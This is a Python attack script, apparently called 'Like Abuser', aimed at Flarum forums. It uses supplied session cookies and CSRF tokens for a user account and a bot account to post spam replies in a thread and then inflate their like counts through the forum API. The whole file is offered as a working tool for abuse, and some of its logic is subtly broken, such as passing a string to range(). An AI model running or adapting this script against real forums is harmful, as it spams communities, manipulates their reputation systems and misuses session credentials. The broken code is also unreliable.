import requests, os, sys, random, string, time

portada = '''
##################################################
##################################################
###           [LIKE ABUSER - FLARUM]           ###
###             [C0d3d by D3vBl4ck]             ###
##################################################
##################################################
'''


def parseURL(url):
    return url.replace("http://", "").replace("https://", "").split('/')[0]


def randString():
    return ''.join(random.sample(string.ascii_letters, 15))


def reply(url, uToken, uCookie, hID):
    try:
        headers = {
            "Content-Type": "application/json; charset=utf-8",
            "Cookie": "flarum_session="+uCookie,
            "Host": parseURL(url),
            "Origin": url,
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0",
            "X-CSRF-Token": uToken
        }
        payload = {"data":{"type":"posts","attributes":{"content":randString()+", coded by d3vbl4ck! ^^! :* @d3vbl4ck"},"relationships":{"discussion":{"data":{"type":"discussions","id":hID}}}}}
        reply_response = requests.post(url+'api/posts',json=payload, headers=headers, timeout=60.0000000)
        replyData = reply_response.json()
        return replyData['data']['id']
    except requests.exceptions.ConnectionError:
        print('[X] REQUEST PROBLEM.')


def botLiker(url,bToken,bCookie,rID):
    try:
        headers = {
            "Content-Type": "application/json; charset=utf-8",
            "Cookie": "flarum_session="+bCookie,
            "Host": parseURL(url),
            "Origin": url,
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0",
            "X-CSRF-Token": bToken,
            "X-HTTP-Method-Override": "PATCH"
        }
        payload = {"data":{"type":"posts","id":rID,"attributes":[True,False,"vote"]}}
        requests.post(url+'api/posts/'+rID, json=payload, headers=headers, timeout=60.0000000)
        return True
    except requests.exceptions.ConnectionError:
        print('[X] REQUEST PROBLEM.')


class Exploit:
    def __init__(self):
        if os.name in ("nt", "dos", "ce"):
            os.system('color e')
            print(portada)
            try:
                url = raw_input("[?] Target: ")
                hID = raw_input("[?] Hilo: ")
                uToken = raw_input("[?] User-CSRF-Token: ")
                uCookie = raw_input("[?] User-Cookie: ")
                bToken = raw_input("[?] Bot-CSRF-Token: ")
                bCookie = raw_input("[?] Bot-Cookie: ")
                cLikes = raw_input("[?] Likes: ")
                for n in range(cLikes):
                    if botLiker(url, bToken, bCookie, reply(url, uToken, uCookie, hID)) == True:
                        print("SUCCES, LIKE: %s, TO POST ID: %s" % (n+1,hID))
                        print("Sleep...ZZZZZZZZZ")
                        time.sleep(15)
                    else:
                        print("ERROR TO LIKE: %s, TO POST ID: %s" % (n+1,hID))
            except KeyError:
                print('[X] Value error')


if __name__ == '__main__':
    Exploit()
